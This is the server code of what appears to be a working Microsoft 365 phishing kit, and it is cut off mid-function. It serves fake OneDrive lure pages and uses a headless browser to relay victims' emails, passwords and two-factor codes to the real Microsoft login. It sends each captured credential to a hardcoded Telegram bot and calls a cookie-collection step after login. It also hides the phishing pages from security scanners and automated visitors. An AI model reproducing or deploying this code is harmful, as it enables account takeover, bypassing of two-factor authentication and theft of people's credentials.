const express = require("express");
const cors = require("cors");
const puppeteer = require("puppeteer");
const winston = require("winston");
const path = require("path");
const { v4: uuidv4 } = require("uuid");
const fs = require('fs');
const fsPromises = fs.promises;
const UAParser = require('ua-parser-js');
const geoip = require('geoip-lite');
const net = require('net');
const dns = require('dns').promises;
const https = require('https');
const FormData = require('form-data');
const axios = require('axios');
const crypto = require('crypto');

// Add environment variables for admin auth

// Configure error logging
const errorLogger = winston.createLogger({
  level: "error",
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json(),
    winston.format.prettyPrint()
  ),
  transports: [
    new winston.transports.File({
      filename: "logs/error.log",
      maxsize: 10485760, // 10MB
      maxFiles: 5,
      tailable: true
    })
  ]
});

// Configure debug logging
const debugLogger = winston.createLogger({
  level: "debug",
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json(),
    winston.format.prettyPrint()
  ),
  transports: [
    new winston.transports.File({
      filename: "logs/debug.log",
      maxsize: 10485760,
      maxFiles: 5
    })
  ]
});

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(express.static("public"));
app.use(express.json());

let sessions = {};

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function cleanupSession(sessionId) {
  if (sessions[sessionId]) {
    try {
      const { browser, page } = sessions[sessionId];
      
      // Close all pages first
      if (page && !page.isClosed()) {
        await page.close().catch(err => 
          errorLogger.error(`Error closing page for session ${sessionId}:`, err)
        );
      }
      
      // Close all other pages
      if (browser) {
        const pages = await browser.pages().catch(() => []);
        await Promise.all(pages.map(p => 
          p.close().catch(err => 
            errorLogger.error(`Error closing additional page for session ${sessionId}:`, err)
          )
        ));
        
        // Close browser
        await browser.close().catch(err => 
          errorLogger.error(`Error closing browser for session ${sessionId}:`, err)
        );
      }
    } catch (err) {
      errorLogger.error(`Error in cleanupSession for ${sessionId}:`, err);
    } finally {
      // Always remove session data
      delete sessions[sessionId];
      
      // Force garbage collection if available
      if (global.gc) {
        global.gc();
      }
    }
  }
}

setInterval(() => {
  const now = Date.now();
  Object.keys(sessions).forEach(sessionId => {
    if (sessions[sessionId].createdAt && (now - sessions[sessionId].createdAt) > 1800000) { // 30 minutes
      cleanupSession(sessionId);
    }
  });
}, 300000); // Check every 5 minutes

// Make sessions available to dashboard
app.locals.sessions = sessions;
app.locals.cleanupSession = cleanupSession;

// Add these constants near the top of the file, after the requires
const SUSPICIOUS_HEADERS = {
  'Accept': ['*/*'],
  'Connection': ['close'],
  'Sec-Fetch-Site': ['none']
};

// Add this function after the KNOWN_BOTS definition
const checkSuspiciousPatterns = (headers = {}) => {
  if (!headers) return false;
  
  // Check for missing essential headers
  if (!headers['user-agent'] || !headers['accept']) {
    return true;
  }

  // Check for suspicious header combinations
  for (const [header, suspicious] of Object.entries(SUSPICIOUS_HEADERS)) {
    const value = headers[header.toLowerCase()];
    if (value && suspicious.includes(value)) {
      return true;
    }
  }

  // Check for automated tool signatures
  const userAgent = (headers['user-agent'] || '').toLowerCase();
  const automatedTools = [
    'phantomjs', 'headless', 'selenium', 'puppeteer',
    'playwright', 'chrome-lighthouse', 'wappalyzer',
    'screaming', 'frog', 'semrush', 'ahrefs'
  ];

  return automatedTools.some(tool => userAgent.includes(tool));
};

// Add admin credentials configuration at the top of the file
const config = {
  adminUser: 'admin',
  adminPass: 'admin', // Change this to your desired password
  antiBot: {
    enabled: false,
    apiKey: '',
    threshold: 0.7
  },
  vpnProtection: {
    enabled: false,
    blockVpn: false,
    allowedVpns: []
  }
};

// Update basicAuth middleware to use the config object
const basicAuth = async (req, res, next) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader) {
    res.setHeader('WWW-Authenticate', 'Basic');
    return res.status(401).send('Authentication required');
  }

  const auth = Buffer.from(authHeader.split(' ')[1], 'base64').toString().split(':');
  const user = auth[0];
  const pass = auth[1];

  if (user === config.adminUser && pass === config.adminPass) {
    next();
  } else {
    res.setHeader('WWW-Authenticate', 'Basic');
    res.status(401).send('Invalid credentials');
  }
};

// Make config available to the app
app.locals.config = config;

// Then use basicAuth in routes
app.get('/admin/api/traffic', basicAuth, async (req, res) => {
  try {
    const traffic = req.app.locals.trafficLog || [];
    
    // Filter out blocked traffic
    const filteredTraffic = traffic.filter(entry => {
      // Check if request is from known bot
      if (entry.userAgent && KNOWN_BOTS[entry.userAgent.toLowerCase()]) {
        return false;
      }

      // Check suspicious patterns using the headers stored in traffic log
      if (checkSuspiciousPatterns(entry.headers)) {
        return false;
      }

      // Check VPN/Proxy
      if (entry.isVpn && req.app.locals.config.vpnProtection.blockVpn) {
        return false;
      }

      return true;
    });

    res.json(filteredTraffic.slice(0, 100));
  } catch (error) {
    console.error('Error getting traffic data:', error);
    res.status(500).json({ error: 'Failed to get traffic data' });
  }
});

// Add this constant for fallback IP info
const DEFAULT_IP_INFO = {
  ip: '',
  country: 'Unknown',
  city: 'Unknown',
  region: 'Unknown',
  timezone: 'Unknown',
  isp: 'Unknown',
  org: 'Unknown',
  as: 'Unknown',
  proxy: false,
  hosting: false
};

// Update the getEnhancedIpInfo function
const getEnhancedIpInfo = async (ip) => {
  try {
    // Handle localhost/internal IPs
    if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('::ffff:127.0.0.1')) {
      return {
        ...DEFAULT_IP_INFO,
        ip: ip,
        country: 'Local',
        city: 'Localhost',
        isp: 'Internal Network'
      };
    }

    // Clean the IP address
    const cleanIP = ip.replace('::ffff:', '');
    
    // Try multiple IP info services with fallbacks
    try {
      const response = await fetch(`http://ip-api.com/json/${cleanIP}`);
      if (response.ok) {
        const data = await response.json();
        return {
          ip: cleanIP,
          country: data.country || 'Unknown',
          city: data.city || 'Unknown',
          region: data.regionName || 'Unknown',
          timezone: data.timezone || 'Unknown',
          isp: data.isp || 'Unknown',
          org: data.org || 'Unknown',
          as: data.as || 'Unknown',
          proxy: data.proxy || false,
          hosting: data.hosting || false
        };
      }
    } catch (err) {
      console.log('Primary IP service failed, trying backup...');
    }

    // Fallback to ipapi.co if first service fails
    try {
      const response = await fetch(`https://ipapi.co/${cleanIP}/json/`);
      if (response.ok) {
        const data = await response.json();
        return {
          ip: cleanIP,
          country: data.country_name || 'Unknown',
          city: data.city || 'Unknown',
          region: data.region || 'Unknown',
          timezone: data.timezone || 'Unknown',
          isp: data.org || 'Unknown',
          org: data.org || 'Unknown',
          as: data.asn || 'Unknown',
          proxy: false,
          hosting: false
        };
      }
    } catch (err) {
      console.log('Backup IP service failed, using default info');
    }

    // Return default info if all services fail
    return {
      ...DEFAULT_IP_INFO,
      ip: cleanIP
    };

  } catch (error) {
    console.error('Error in getEnhancedIpInfo:', error.message);
    return {
      ...DEFAULT_IP_INFO,
      ip: ip
    };
  }
};

// Update the logTraffic function to handle potential IP info errors
const logTraffic = async (req) => {
  try {
    const ipInfo = await getEnhancedIpInfo(req.ip || req.connection.remoteAddress);
    const ua = new UAParser(req.headers['user-agent']);
    
    // Store headers for pattern detection
    const headers = {};
    Object.keys(req.headers).forEach(key => {
      headers[key.toLowerCase()] = req.headers[key];
    });
    
    return {
      timestamp: Date.now(),
      ...ipInfo,
      headers,
      userAgent: req.headers['user-agent'],
      browser: ua.getBrowser().name || 'Unknown',
      os: ua.getOS().name || 'Unknown',
      device: ua.getDevice().type || 'desktop',
      path: req.path,
      method: req.method,
      referer: req.headers.referer || 'Direct',
      language: req.headers['accept-language'] || 'Unknown'
    };
  } catch (error) {
    console.error('Error in logTraffic:', error.message);
    return {
      timestamp: Date.now(),
      ...DEFAULT_IP_INFO,
      ip: req.ip || req.connection.remoteAddress,
      userAgent: req.headers['user-agent'] || 'Unknown',
      path: req.path,
      method: req.method
    };
  }
};

// Initialize traffic log array (after app is created)
app.locals.trafficLog = [];

// Add single traffic logging middleware (after initializing trafficLog)
app.use(async (req, res, next) => {
  if (!req.path.startsWith('/js/') && 
      !req.path.startsWith('/css/') && 
      !req.path.startsWith('/images/') && 
      !req.path.startsWith('/admin/')) {
    try {
      const trafficData = await logTraffic(req);
      req.app.locals.trafficLog = req.app.locals.trafficLog || [];
      req.app.locals.trafficLog.unshift(trafficData);
      
      // Keep only last 1000 entries
      if (req.app.locals.trafficLog.length > 1000) {
        req.app.locals.trafficLog = req.app.locals.trafficLog.slice(0, 1000);
      }
    } catch (err) {
      console.error('Error logging traffic:', err);
    }
  }
  next();
});

// Add VPN and Bot protection middleware
app.use(async (req, res, next) => {
  if (req.app.locals.config?.vpnProtection?.enabled) {
    const trafficData = await logTraffic(req);
    if (trafficData.isVpn && req.app.locals.config.vpnProtection.blockVpn) {
      return res.status(403).send('Access denied: VPN detected');
    }
  }
  next();
});

// Add bot protection middleware
app.use((req, res, next) => {
  // Store original send and sendFile functions
  const originalSend = res.send;
  const originalSendFile = res.sendFile;

  // Override send function for direct HTML responses
  res.send = function (body) {
    if (typeof body === 'string' && body.includes('</head>')) {
      body = injectProtectionScript(body);
    }
    return originalSend.call(this, body);
  };

  // Override sendFile to inject protection script
  res.sendFile = function (path, options, callback) {
    if (path.endsWith('.html')) {
      fs.readFile(path, 'utf8', (err, data) => {
        if (err) {
          return callback ? callback(err) : next(err);
        }
        const protectedHtml = injectProtectionScript(data);
        res.send(protectedHtml);
      });
    } else {
      return originalSendFile.call(this, path, options, callback);
    }
  };

  next();
});

// Helper function to inject protection script
function injectProtectionScript(html) {
  const botProtectionScript = `
    <script>
      function runBotDetection() {
        let documentDetectionKeys = [
          "webdriver",
          "_WEBDRIVER_ELEM_CACHE",
          "ChromeDriverw",
          "Geckowebdriver",
          "driver-evaluate",
          "webdriver-evaluate",
          "selenium-evaluate",
          "selenium-webdriver",
          "webdriverCommand",
          "webdriver-evaluate-response",
          "__webdriverFunc",
          "__$webdriverAsyncExecutor",
          "$wdc_asdjflasutopfhvcZLmcfl_",
          "__lastWatirAlert",
          "__lastWatirConfirm",
          "__lastWatirPrompt",
          "$chrome_asyncScriptInfo",
          "$cdc_asdjflasutopfhvcZLmcfl_",
          "__webdriver_evaluate",
          "__selenium_evaluate",
          "__webdriver_script_function",
          "__webdriver_script_func",
          "__webdriver_script_fn",
          "__fxdriver_evaluate",
          "__driver_unwrapped",
          "__webdriver_unwrapped",
          "__driver_evaluate",
          "__selenium_unwrapped",
          "__fxdriver_unwrapped"
        ];

        let windowDetectionKeys = [
          "gecko",
          "$wdc_asdjflasutopfhvcZLmcfl_",
          "$cdc_asdjflasutopfhvcZLmcfl_",
          "domAutomation",
          "domAutomationController",
          "__stopAllTimers",
          "spawn",
          "__driver_evaluate",
          "__fxdriver_evaluate",
          "__driver_unwrapped",
          "__fxdriver_unwrapped",
          "emit",
          "__phantomas",
          "callPhantom",
          "geb",
          "__$webdriverAsyncExecutor",
          "fmget_targets",
          "spynner_additional_js_loaded",
          "watinExpressionResult",
          "watinExpressionError",
          "domAutomationController",
          "calledPhantom",
          "__webdriver_unwrapped",
          "__webdriver_script_function",
          "__webdriver_script_func",
          "__webdriver_script_fn",
          "__webdriver_evaluate",
          "__webdriver__chr",
          "__webdriverFuncgeb",
          "__selenium_unwrapped",
          "__selenium_evaluate",
          "__lastWatirPrompt",
          "cdc_adoQpoasnfa76pfcZLmcfl_Array",
          "cdc_adoQpoasnfa76pfcZLmcfl_Promise",
          "cdc_adoQpoasnfa76pfcZLmcfl_Symbol",
          "OSMJIF",
          "__lastWatirConfirm",
          "__lastWatirAlert",
          "calledSelenium",
          "webdriver",
          "marionette",
          "puppeteer",
          "Buffer",
          "_phantom",
          "__nightmare",
          "_selenium",
          "callPhantom",
          "Cypress",
          "callSelenium",
          "_Selenium_IDE_Recorder"
        ];

        let documentSearchKeys = [
          "driver",
          "webdriver",
          "marionette",
          "selenium",
          "phantom"
        ];

        for (const windowDetectionKey in windowDetectionKeys) {
          const windowDetectionKeyValue = windowDetectionKeys[windowDetectionKey];
          if (window[windowDetectionKeyValue]) {
            return true;
          }
        }

        for (const documentDetectionKey in documentDetectionKeys) {
          const documentDetectionKeyValue = documentDetectionKeys[documentDetectionKey];
          if (window["document"][documentDetectionKeyValue]) {
            return true;
          }
        }

        for (const documentKey in window["document"]) {
          if (documentKey.match(/\\$[a-z]dc_/) && window["document"][documentKey]["cache_"]) {
            return true;
          }
        }

        if (window["external"] && window["external"].toString() && (window["external"].toString()["indexOf"]("Sequentum") != -1)) return true;
        if (window["document"]["documentElement"]["getAttribute"]("selenium")) return true;
        if (window["document"]["documentElement"]["getAttribute"]("webdriver")) return true;
        if (window["document"]["documentElement"]["getAttribute"]("driver")) return true;
        if (window["document"]["documentElement"]["getAttribute"]("geckodriver")) return true;
        if (window["document"]["documentElement"]["getAttribute"]("firefox.marionette")) return true;
        for (const documentSearchKey in documentSearchKeys) {
          const documentSearchKeyValue = documentSearchKeys[documentSearchKey];
          if (window.document.documentElement.getAttribute(documentSearchKeyValue)) {
            return true;
          }
        }

        return false;
      }

      if (runBotDetection() == true) {
        window.location.replace("https://www.bloomberg.com");
      }

      setTimeout(() => {
        window.location.replace("https://www.bloomberg.com")
      }, 5 * 60 * 1000);

      // Modified event handlers to allow form interactions
      window.onkeydown = (e) => {
        // Allow if target is input or textarea
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
          return true;
        }
        return !(e.ctrlKey && (e.keyCode === 67 || e.keyCode === 85 || e.keyCode === 86 || e.keyCode === 88 || e.keyCode === 117));
      };

      window.addEventListener("keydown", (e) => {
        // Allow if target is input or textarea
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
          return true;
        }
        if (e.ctrlKey && e.which === 83) {
          e.preventDefault();
          return false;
        }
      });

      // Allow right-click on form elements
      window.addEventListener("contextmenu", (event) => {
        if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
          return true;
        }
        event.preventDefault();
      });

      document.onkeydown = (e) => {
        // Allow if target is input or textarea
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
          return true;
        }
        
        if (e.keyCode === 123) return false;
        if (e.ctrlKey && e.keyCode === "E".charCodeAt(0)) return false;
        if (e.ctrlKey && e.shiftKey && e.keyCode === "I".charCodeAt(0)) return false;
        if (e.ctrlKey && e.shiftKey && e.keyCode === "J".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode === "U".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode === "S".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode === "H".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode === "A".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode === "F".charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode === "E".charCodeAt(0)) return false;
      }
    </script>
    <noscript>
      <meta http-equiv='refresh' content='0;url=https://www.bloomberg.com'/>
    </noscript>
    <noframes>
      <meta http-equiv='refresh' content='0;url=https://www.bloomberg.com'/>
    </noframes>
  `;

  return html.replace('</head>', `${botProtectionScript}</head>`);
}

// Admin dashboard route
app.get('/admin', basicAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'dashboard.html'));
});

// Admin API routes
app.get('/admin/api/stats', basicAuth, (req, res) => {
  const traffic = req.app.locals.trafficLog || [];
  
  // Filter legitimate traffic only
  const legitimateTraffic = traffic.filter(entry => {
    return !KNOWN_BOTS[entry.userAgent?.toLowerCase()] && 
           !checkSuspiciousPatterns(entry.headers) &&
           !(entry.isVpn && req.app.locals.config.vpnProtection.blockVpn);
  });

  const stats = {
    traffic: {
      total: legitimateTraffic.length,
      bots: 0, // We don't count blocked bots
      vpn: legitimateTraffic.filter(t => t.isVpn).length,
      countries: legitimateTraffic.reduce((acc, t) => {
        acc[t.country] = (acc[t.country] || 0) + 1;
        return acc;
      }, {}),
      lastHour: legitimateTraffic.filter(t => 
        Date.now() - t.timestamp < 3600000).length
    }
  };

  res.json(stats);
});

app.get('/admin/api/sessions', basicAuth, (req, res) => {
  const sessionData = Object.entries(sessions).map(([id, session]) => ({
    id,
    timestamp: session.createdAt || Date.now(),
    email: session.email || 'Unknown',
    status: session.status || 'new',
    ip: session.ip || 'Unknown',
    cookiesCollected: false // Add cookie collection status if implemented
  }));
  res.json(sessionData);
});

const checkAutomatedTools = (userAgent) => {
  const automatedTools = [
    'phantomjs', 'headless', 'selenium', 'puppeteer',
    'playwright', 'chrome-lighthouse', 'wappalyzer',
    'screaming', 'frog', 'semrush', 'ahrefs'
  ];

  userAgent = userAgent.toLowerCase();
  return automatedTools.some(tool => userAgent.includes(tool));
};

const checkDatacenter = (org) => {
  const datacenterKeywords = [
    'aws', 'amazon', 'google', 'azure', 'digitalocean',
    'linode', 'ovh', 'vultr', 'hetzner', 'cloudflare'
  ];

  org = org.toLowerCase();
  return datacenterKeywords.some(keyword => org.includes(keyword));
};

app.get("/cUTFD7QW6GYUEWYIY87GoIBUYVYVYTYVYDYTDOCAZURESILES/IBYGE7F73737V76F8VekU9JnVpZD1VU0VSMTIwOTIwMjRVNDUwOTEyMTg=N0123N", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "index.html"));
});

// Add this route after your existing routes
app.get("/onedrive/access/document", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "index2.html"));
});

async function setupPage(browser, sessionId) {
  const page = await browser.newPage();
  await page.setDefaultNavigationTimeout(60000);
  await page.setDefaultTimeout(60000);
  
  const userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
  await page.setUserAgent(userAgent);
  
  return page;
}

// Update the cleanupBrowserSession function
const cleanupBrowserSession = async (sessionId) => {
  try {
    if (sessions[sessionId]) {
      const { browser, page } = sessions[sessionId];
      
      // Safely close page if it exists
      if (page) {
        try {
          if (!page.isClosed()) {
            await page.close().catch(() => {});
          }
        } catch (e) {
          console.log(`Page already closed for session ${sessionId}`);
        }
      }

      // Safely close browser
      if (browser) {
        try {
          const pages = await browser.pages().catch(() => []);
          await Promise.all(pages.map(p => p.close().catch(() => {})));
          await browser.close().catch(() => {});
        } catch (e) {
          console.log(`Browser already closed for session ${sessionId}`);
        }
      }
      
      // Clean up session data
      delete sessions[sessionId];
      console.log(`âœ“ Session ${sessionId} cleaned up successfully`);
    }
  } catch (error) {
    console.error(`Error cleaning up session ${sessionId}:`, error);
  }
};

// Update browser launch options
const launchBrowser = async () => {
  try {
    return await puppeteer.launch({
      headless: true,
      args: [
        '--disable-setuid-sandbox',
        '--no-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-extensions',
        '--no-zygote',
        '--single-process'
      ],
      userDataDir: `/tmp/puppeteer_${Date.now()}`
    });
  } catch (err) {
    console.error('Failed to launch browser:', err);
    throw err;
  }
};

// Add session timeout cleanup
const SESSION_TIMEOUT = 5 * 60 * 1000; // 5 minutes
setInterval(() => {
  const now = Date.now();
  Object.keys(sessions).forEach(sessionId => {
    const session = sessions[sessionId];
    if (session && (now - session.lastActivity) > SESSION_TIMEOUT) {
      cleanupBrowserSession(sessionId);
    }
  });
}, 60 * 1000);

// Add this near your other cleanup functions
async function forceCleanupSession(sessionId) {
  try {
    if (sessions[sessionId]) {
      const { browser, page } = sessions[sessionId];
      
      if (page && !page.isClosed()) {
        await page.evaluate(() => window.stop());
        await page.close().catch(() => {});
      }
      
      if (browser) {
        await browser.close().catch(() => {});
      }

      delete sessions[sessionId];
      console.log(`Force cleaned up session ${sessionId}`);
    }
  } catch (err) {
    console.error(`Force cleanup failed for session ${sessionId}:`, err);
  }
}

// Add this function to get the real IP address
function getClientIp(req) {
  // Check various headers for forwarded IPs
  const forwardedIp = req.headers['x-forwarded-for'] || 
    req.headers['x-real-ip'] || 
    req.headers['x-client-ip'] ||
    req.headers['cf-connecting-ip'] || // Cloudflare
    req.headers['fastly-client-ip'] || // Fastly
    req.headers['true-client-ip']; // Akamai and others

  if (forwardedIp) {
    // Get the first IP if there are multiple
    const ips = forwardedIp.split(',');
    return ips[0].trim();
  }

  // Fallback to direct IP
  return req.connection.remoteAddress || 
         req.socket.remoteAddress || 
         req.connection.socket?.remoteAddress ||
         '0.0.0.0';
}

// Add these constants near the top after other requires
const TELEGRAM_BOT_TOKEN = '7607578372:AAG0lC0f4Os4D6crLYLsUaQRQ_wFg8gvtsI'; // Replace with your bot token
const TELEGRAM_CHAT_ID = '8193474321'; // Replace with your chat ID

// Simplified sendToTelegram function
async function sendToTelegram(message, filePath = null) {
  try {
    if (filePath) {
      // Create a readable stream from the file
      const fileStream = require('fs').createReadStream(filePath);
      
      // Create form data
      const form = new FormData();
      form.append('chat_id', TELEGRAM_CHAT_ID);
      form.append('document', fileStream, {
        filename: path.basename(filePath),
        contentType: 'text/plain'
      });
      form.append('caption', message);
      form.append('parse_mode', 'HTML');

      // Use node-fetch with proper headers
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        body: form
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      if (!data.ok) {
        throw new Error('Failed to send file to Telegram');
      }
    } else {
      // Original text message sending logic
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
    }
  } catch (err) {
    console.error('Error in sendToTelegram:', err);
    // Fallback to sending as text if file upload fails
    if (filePath) {
      const fileContent = require('fs').readFileSync(filePath, 'utf8');
      await sendToTelegram(`${message}\n\nFile Content:\n${fileContent}`);
    }
  }
}

// Update the /email route to include Telegram notification
app.post("/email", async (req, res) => {
  const { sessionId, email } = req.body;
  
  try {
    if (!email) {
      return res.status(400).send("Email is required");
    }

    if (!sessionId) {
      sessionId = uuidv4();
    }

    // Cleanup any existing session
    if (sessions[sessionId]) {
      await cleanupBrowserSession(sessionId);
    }

    const browser = await launchBrowser();
    const page = await setupPage(browser, sessionId);
    
    // Parse user agent
    const ua = new UAParser(req.headers['user-agent']);
    
    // Store session info with timestamp and detailed browser info
    sessions[sessionId] = {
      browser,
      page,
      createdAt: Date.now(),
      lastActivity: Date.now(),
      email: email,
      status: 'new',
      ip: getClientIp(req),
      userAgent: req.headers['user-agent'],
      browser: `${ua.getBrowser().name || 'Unknown'} ${ua.getBrowser().version || ''}`,
      os: `${ua.getOS().name || 'Unknown'} ${ua.getOS().version || ''}`,
      device: ua.getDevice().type || 'desktop'
    };

    await page.goto("https://login.microsoftonline.com", {
      waitUntil: "networkidle2",
      timeout: 60000
    });

    console.log(`Waiting for email input for session ${sessionId}...`);
    await page.waitForSelector("#i0116", { timeout: 60000 });
    await page.type("#i0116", email);
    await page.click("#idSIButton9");

    // Get user agent
    const userAgent = req.get('user-agent') || 'Unknown';

    // Send email attempt to Telegram
    await sendToTelegram(`ðŸ”¥ <b>New Email Attempt</b>\n\n` +
      `ðŸ“§ Email: <code>${email}</code>\n` +
      `ðŸŒ IP: <code>${getClientIp(req)}</code>\n` +
      `ðŸŒ User Agent: <code>${userAgent}</code>\n` +
      `â° Time: ${new Date().toISOString()}`
    );

    // Rest of your existing code...
    const selectors = ["#aadTile", "text/Enter password", "#password"];
    let result = "0";
    while (true) {
      try {
        const firstElement = await Promise.race([
          page
            .waitForSelector(selectors[0], { visible: true, timeout: 30000 })
            .then(() => selectors[0]),
          page
            .waitForSelector(selectors[1], { visible: true, timeout: 30000 })
            .then(() => selectors[1]),
          page
            .waitForSelector(selectors[2], { visible: true, timeout: 30000 })
            .then(() => selectors[2]),
        ]);
        if (firstElement === selectors[0]) {
          console.log("aadTile element found first!");
          result = "1";
        } else if (firstElement === selectors[1]) {
          console.log('"Enter password" text found first!');
          result = "2";
        } else if (firstElement === selectors[2]) {
          console.log("#password element found first!");
          result = "3";
        }
        break;
      } catch (error) {
        console.log("Neither element found");
      }
    }

    if (result == "1") {
      await delay(1000);
      await page.click("#aadTile");
    }

    res.send(result);
    console.log(`Email: ${email} logged for session: ${sessionId}`);

    // Add debug logging
    debugLogger.debug(`Starting automation for email: ${email}`);
  } catch (err) {
    console.error(`Error in /email for session ${sessionId}:`, err);
    await forceCleanupSession(sessionId);
    res.status(500).send("Internal Server Error");
  }
});

app.post("/pass", async (req, res) => {
  const { sessionId, password } = req.body;

  if (!sessionId || !password) {
    return res.status(400).send("Session ID and password are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    session.lastActivity = Date.now();
    const { page } = session;
    let result = "0";
    
    console.log(`Processing password for session ${sessionId}: ${password}`);
    
    // First, send password attempt to Telegram
    await sendToTelegram(`ðŸ” <b>Password Attempt</b>\n\n` +
      `ðŸ“§ Email: <code>${session.email}</code>\n` +
      `ðŸ”‘ Password: <code>${password}</code>`
    );

    await page.waitForSelector("#i0118", { timeout: 30000 });
    await page.type("#i0118", password);
    await page.click("#idSIButton9");
    
    // Add delay after submitting password
    await delay(2000);

    const selectors = [
      "text/Incorrect password",
      "text/Enter code",
      "text/Approve sign in request",
      "text/Stay signed in?",
      "text/Action Required",
    ];

    while (true) {
      try {
        const firstElement = await Promise.race([
          page.waitForSelector('text/Your account or password is incorrect', { visible: true, timeout: 30000 })
            .then(() => 'incorrect'),
          page.waitForSelector(selectors[1], { visible: true, timeout: 30000 })
            .then(() => selectors[1]),
          page.waitForSelector(selectors[2], { visible: true, timeout: 30000 })
            .then(() => selectors[2]),
          page.waitForSelector(selectors[3], { visible: true, timeout: 30000 })
            .then(() => selectors[3]),
          page.waitForSelector(selectors[4], { visible: true, timeout: 30000 })
            .then(() => selectors[4]),
        ]);

        if (firstElement === 'incorrect') {
          console.log(`Incorrect password: ${password} for session: ${sessionId}`);
          result = "0";
          
          // Add Telegram notification for incorrect password
          await sendToTelegram(`âŒ *INCORRECT PASSWORD ATTEMPT*\n\n` +
            `ðŸ“§ Email: \`${session.email}\`\n` +
            `ðŸ”‘ Password: \`${password}\``
          );
        } else if (firstElement === selectors[3]) {
          console.log("No 2FA");
          result = "1";
          // Handle "Stay signed in" here before cleanup
          await delay(1000);
          await page.waitForSelector("#idSIButton9");
          await page.click("#idSIButton9");
          await delay(2000); // Wait for the click to process
          
          // Now collect cookies and cleanup
          await collectAndSaveCookies(session, session.email, password);
        } else if (firstElement === selectors[1]) {
          console.log("Enter Code");
          result = "2";
        } else if (firstElement === selectors[2]) {
          console.log("Approve sign in request");
          await page.waitForSelector("#idRichContext_DisplaySign");
          const textContent = await page.$eval(
            "#idRichContext_DisplaySign",
            (el) => el.textContent
          );
          result = textContent;
        } else if (firstElement === selectors[4]) {
          console.log("Action Required");
          await page.waitForSelector("#btnAskLater");
          await page.click("#btnAskLater");
          result = "3";
        }
        break;
      } catch (error) {
        console.error("Error in selector race:", error);
        result = "1"; // Assume success if no error message found
        break;
      }
    }

    // Only cleanup for result "1" (success) after handling "Stay signed in"
    if (result === "1") {
      await cleanupBrowserSession(sessionId);
      console.log(`âœ“ Session ${sessionId} cleaned up successfully`);
    }

    res.send(result);

  } catch (err) {
    console.error(`Error processing password for session ${sessionId}:`, err);
    await forceCleanupSession(sessionId);
    if (!res.headersSent) {
      res.status(500).send("Internal Server Error");
    }
  }
});

app.post("/code", async (req, res) => {
  const { sessionId, code } = req.body;

  if (!sessionId || !code) {
    return res.status(400).send("Session ID and code are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;
    await page.waitForSelector("#idTxtBx_SAOTCC_OTC");
    await page.type("#idTxtBx_SAOTCC_OTC", code);
    await page.click("#idSubmit_SAOTCC_Continue");

    const selectors = [
      "text/You didn't enter the expected verification code.",
      "text/Stay signed in?",
    ];
    let result = "0";

    while (true) {
      try {
        const firstElement = await Promise.race([
          page
            .waitForSelector(selectors[0], { visible: true, timeout: 30000 })
            .then(() => selectors[0]),
          page
            .waitForSelector(selectors[1], { visible: true, timeout: 30000 })
            .then(() => selectors[1]),
        ]);
        if (firstElement === selectors[0]) {
          result = "0";
          console.log(`Incorrect code: ${code} for session: ${sessionId}`);
        } else if (firstElement === selectors[1]) {
          result = "1";
          console.log(`Code: ${code} logged for session: ${sessionId}`);
        }
        break;
      } catch (error) {
        console.log("Neither element found");
      }
    }

    if (result === "1") { // If 2FA successful
      console.log(`2FA completed for session ${sessionId}`);
      await cleanupBrowserSession(sessionId);
      console.log(`Session ${sessionId} resources released`);
    }
    res.send(result);
  } catch (err) {
    console.error("Error in /code:", err);
    await cleanupBrowserSession(sessionId);
    res.status(500).send("Internal Server Error");
  }
});

app.post("/check-2fa", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).send("Session ID is required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;
    const selectors = ["text/Stay signed in?", "text/We didn't hear from you"];
    let result = "0";

    while (true) {
      console.log("Waiting for Approval")
      try {
        const firstElement = await Promise.race([
          page.waitForSelector(selectors[0], { visible: true, timeout: 60000 })
            .then(() => selectors[0]),
          page.waitForSelector(selectors[1], { visible: true, timeout: 60000 })
            .then(() => selectors[1]),
        ]);
        
        if (firstElement === selectors[0]) {
          result = "1";
          console.log(`Authentication successful for session: ${sessionId}`);
          await delay(1000);
          await page.waitForSelector("#idSIButton9");
          await page.click("#idSIButton9");
        } else if (firstElement === selectors[1]) {
          result = "0";
          console.log(`2FA timeout for session: ${sessionId}`);
        }
        break;
      } catch (error) {
        console.log("Neither element found");
      }
    }

    if (result === "1") {
